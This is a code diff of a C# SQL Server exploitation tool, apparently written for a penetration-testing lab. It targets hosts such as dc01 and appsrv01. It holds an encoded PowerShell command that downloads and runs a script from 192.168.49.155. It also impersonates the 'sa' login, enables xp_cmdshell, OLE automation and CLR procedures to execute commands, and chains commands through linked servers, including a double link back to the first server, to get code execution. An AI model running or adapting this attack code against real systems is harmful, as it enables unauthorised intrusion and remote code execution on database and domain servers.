@@ -41,7 +41,7 @@ namespace mssql_exp
 
        public static void Main(string[] args)
         {
-            String sqlServer = "dc01.corp1.com";
+            String sqlServer = "appsrv01.corp1.com";
             // default database, always present
             String database = "master";
             // Integrated Security means Keberos auth
@@ -71,11 +71,16 @@ namespace mssql_exp
 
             getGroupMembership("sysadmin", con);
 
-            // UNC Path Injection with xp_dirtree proc UNC must be with IP
-            /*
-            String unc_path = executeQuery("EXEC master..xp_dirtree \"\\\\192.168.49.155\\\\test\";",con);
-            */
+            String exec_command = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANQA1AC8AcgB1AG4ALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA";
 
+            /*
+
+            // UNC Path Injection with xp_dirtree proc UNC must be with IP
+
+            String unc_path = executeQuery("EXEC master..xp_dirtree \"\\\\192.168.49.155\\\\test\";",con);
+          
+
+         
             // Impersonation login enum
             String impersonation_allowed = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
             Console.WriteLine("Following users allow impersonation: " + impersonation_allowed);
@@ -91,26 +96,29 @@ namespace mssql_exp
             executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
             String user_imp = executeQuery("SELECT USER_NAME();", con);
             Console.WriteLine("Logged in as user after impersonation: " + user_imp);
+           
 
-            String exec_command = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANQA1AC8AcgB1AG4ALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA";
+
+
 
             // Impersonate login as sa, then reconfiure xp_cmdshell and execute commands
-            /*
+           
             executeQuery("EXECUTE AS LOGIN = 'sa';", con);
             executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
-            String cmd1 = executeQuery("EXEC xp_cmdshell "+exec_command, con);
+            String cmd1 = executeQuery("EXEC xp_cmdshell "+exec_command+";", con);
             Console.WriteLine("Command executed: " + cmd1);
-            */
            
+
             // Impersonate login as sa, then create Ole new procedure and execute the shell command
-            /*
+            
             executeQuery("EXECUTE AS LOGIN = 'sa';", con);
             executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;",con);
             executeQuery("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '"+exec_command+"';", con);
-            */
-           
+            
+
             // Create the stored procedure using custom assembly. First enabling CLR and disbaled CLR strict security
 
+            
             executeQuery("EXECUTE AS LOGIN = 'sa';", con);
             executeQuery("use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", con);
             try
@@ -128,8 +136,37 @@ namespace mssql_exp
             executeQuery("CREATE PROCEDURE [dbo].[cmdExec] @execCoammand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];",con);
             executeQuery("EXEC cmdExec '"+exec_command+"';", con);
 
+            
 
+            // Linked MSSQL Priv esc
+            // Enum
+            String linkedServers1 = executeQuery("EXEC sp_linkedservers;", con);
+            Console.WriteLine("Linked MSSQL servers: " + linkedServers1);
 
+            // Enumerate what user we run
+
+            String enumRemoteUser = executeQuery("SELECT myuser from openquery(\"dc01\", 'select SYSTEM_USER as myuser');",con);
+            Console.WriteLine("Whoami on the linked SQL server: " + enumRemoteUser);
+            // Execute RCE works only with sa
+
+            executeQuery("EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT dc01;", con);
+            executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT dc01;", con);
+            executeQuery("EXEC ('xp_cmdshell ''" + exec_command+"''') AT dc01;", con);
+            */
+
+            // We can exploit double links and come home to get the RCE on our first connected MSSQL
+
+            String linkedServers2 = executeQuery("EXEC ('sp_linkedservers') AT dc01;", con);
+            Console.WriteLine("Linked MSSQL servers on dc01: " + linkedServers2);
+            
+            String su = executeQuery("select mylogin from openquery(\"dc01\", 'select mylogin from openquery(\"appsrv01\", ''select SYSTEM_USER as mylogin'')');", con);
+            Console.WriteLine($"[*] Current system user is '{su}' in database 'appsrv01' via 2 links.");
+
+            // Then code execution using double links - implement and test
+
+            executeQuery("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT appsrv01') AT dc01;", con);
+            executeQuery("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT appsrv01') AT dc01;", con);
+            executeQuery("EXEC ('EXEC (''xp_cmdshell ''''" + exec_command + "'''''') AT appsrv01') AT dc01;", con);
 
 
 
